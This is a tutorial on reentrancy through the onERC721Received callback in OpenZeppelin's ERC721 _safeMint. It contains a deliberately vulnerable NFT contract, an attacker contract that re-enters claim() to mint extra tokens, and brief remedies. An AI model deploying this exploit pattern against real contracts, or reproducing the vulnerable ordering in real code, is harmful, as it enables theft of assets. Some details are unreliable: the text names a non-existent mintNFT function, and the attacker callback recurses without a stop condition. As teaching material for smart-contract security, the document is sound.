# Unprotected Callback

When writing or interacting with `callback functions in solidity`, it's important to ensure that they can't be used to perform `unexpected effects`.

## When **SafeMint** Becomes **Unsafe**

Take for example OpenZeppelin's ERC721._safeMint_ function:


When minting NFTs, the code uses _safeMint function_ of the OZ reference implementation. This function is safe because it checks whether the receiver can 
`receive ERC721 tokens`. The can prevent the case that a NFT will be minted to a contract that cannot handle `ERC721 tokens`. 

    /**
      * @dev Same as {xref-ERC721-_safeMint-address-uint256-}[`_safeMint`], with an additional `data` parameter which is
      * forwarded in {IERC721Receiver-onERC721Received} to contract recipients.
      */
    function _safeMint(
        address to,
        uint256 tokenId,
        bytes memory _data
    ) internal virtual {
        _mint(to, tokenId);
        require(
            _checkOnERC721Received(address(0), to, tokenId, _data),
            _____________________________________________________
            
            
            "ERC721: transfer to non ERC721Receiver implementer"
        );
    }
    
This all seems fine, but since `_checkOnERC721Received is a callback function`.
However, this `external function call` creates a `security loophole`. Specifically, the attacker can perform a reentrant call inside the `onERC721Received callback`.


### NFT contract

Any user can buy NFT in this NFT contract by activating the `buyNFT() function` , and then they can claim their NFT.

    // SPDX-License-Identifier: UNLICENSED

    pragma solidity 0.8.7;

    import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/extensions/ERC721Enumerable.sol";
    import "hardhat/console.sol";

    contract safeNFT is ERC721Enumerable {
        uint256 price;
        mapping(address=>bool) public canClaim;

        constructor(string memory tokenName, string memory tokenSymbol,uint256 _price) ERC721(tokenName, tokenSymbol) {
            price = _price; //price = 0.01 ETH
        }

        function buyNFT() external payable {
            require(price==msg.value,"INVALID_VALUE");
            canClaim[msg.sender] = true;
        }

        function claim() external {
            require(canClaim[msg.sender],"CANT_MINT");
            _safeMint(msg.sender, totalSupply()); 
            canClaim[msg.sender] = false;
        }

    }


When minting NFTs, the code uses `_safeMint() function` of the OZ reference implementation. This 
function is `safe` because it checks whether the receiver can `receive ERC721 tokens`.
`IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, data)
returns (bytes4 retval)`




#### The Attacker contract

this external function call creates a security loophole. Specifically, the attacker can perform a 
reentrant call inside the onERC721Received callback.


    contract Attack{    
      
            // safeNFT is nft contract where anyone can perform any operation
            
            safeNFT public ContractAddress;
            constructor(address _address) payable {
                ContractAddress=safeNFT(_address);
            }

      
            function exploit() public payable  {
                ContractAddress.buyNFT{value: 0.01 ether}();
                ContractAddress.claim();
          }

        function onERC721Received(address from, address _from, uint256 _tokenId, bytes calldata) external  returns(bytes4) {

                ContractAddress.claim();


            return 0x150b7a02;
        }

    }
    
    
The attacker can `invoke` the `mintNFT function` again in the `onERC721Received callback` .

### Prevent technique

To remedy the `vulnerability`  use the `ERC721._mint function` or a `Reentrancy Guard`.
